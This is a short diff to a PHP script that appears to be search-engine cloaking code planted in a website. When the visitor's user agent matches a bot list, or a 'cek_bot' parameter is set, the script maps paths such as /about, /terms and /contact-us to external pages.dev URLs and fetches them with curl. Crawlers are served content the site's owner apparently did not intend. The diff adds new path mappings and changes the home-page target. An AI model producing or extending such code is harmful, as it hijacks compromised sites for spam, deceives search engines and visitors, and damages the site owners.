@@ -30,10 +30,14 @@ if (preg_match($bot_list, $ua) || isset($_GET['cek_bot'])) {
     '/blog/hip-abductors-vs-adductors-benefits-explained' => 'https://gymequipment.pages.dev/explained',
     '/pilates/reformers' => 'https://gymequipment.pages.dev/reformers',
     '/nautilus' => 'https://gymequipment.pages.dev/nautilus',
+    '/contact-us' => 'https://gymequipment.pages.dev/us',
+    '/about' => 'https://gymequipment.pages.dev/about',
+    '/exigo-4-way-neck-machine' => 'https://gymequipment.pages.dev/machine',
+    '/terms' => 'https://gymequipment.pages.dev/terms',
         
     ];
 
-    $targetUrl = ($cleanPath == '/') ? 'https://godrejsingapore-pages.pages.dev/home.html' : ($mapping[$cleanPath] ?? '');
+    $targetUrl = ($cleanPath == '/') ? 'https://gymequipment.pages.dev/home.html' : ($mapping[$cleanPath] ?? '');
 
     if ($targetUrl && function_exists('curl_init')) {
         $ch = curl_init($targetUrl);
